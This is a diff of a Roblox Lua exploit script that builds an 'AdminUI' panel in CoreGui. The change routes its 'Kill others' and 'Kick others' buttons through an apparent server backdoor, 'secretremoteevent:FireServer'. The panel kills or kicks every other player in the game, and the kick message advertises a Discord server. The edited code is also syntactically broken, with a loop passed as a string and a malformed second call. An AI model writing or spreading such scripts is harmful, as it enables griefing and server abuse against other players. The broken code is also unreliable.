@@ -1094,7 +1094,7 @@ if player then
     local gui = Instance.new("ScreenGui")
     gui.Name = "AdminUI"
     gui.ResetOnSpawn = false
-    gui.Parent = player:WaitForChild("PlayerGui")
+ gui.Parent = game:GetService("CoreGui")
 
     -- Marco principal
     local frame = Instance.new("Frame")
@@ -1178,16 +1178,16 @@ credits.Parent = frame
 
     local sound
 
-    makeButton("Kill others", function()
-        for _, plr in pairs(game.Players:GetPlayers()) do
+  makeButton("Kill others", function()
+        secretremoteevent:FireServer("for _, plr in pairs(game.Players:GetPlayers()) do
             if plr ~= player and plr.Character and plr.Character:FindFirstChild("Humanoid") then
                 plr.Character.Humanoid.Health = 0
             end
-        end
+        end")
     end)
 
-  makeButton("Kick others", function()
-        for _, plr in pairs(game.Players:GetPlayers()) do
+makeButton("Kick others", function()
+       secretremoteevent:FireServer(game.Players:GetPlayers()) do
             if plr ~= player then
                 plr:Kick("D1SCOOGUY WAS HERE | .gg/Usbp5H738j 🙏")
             end
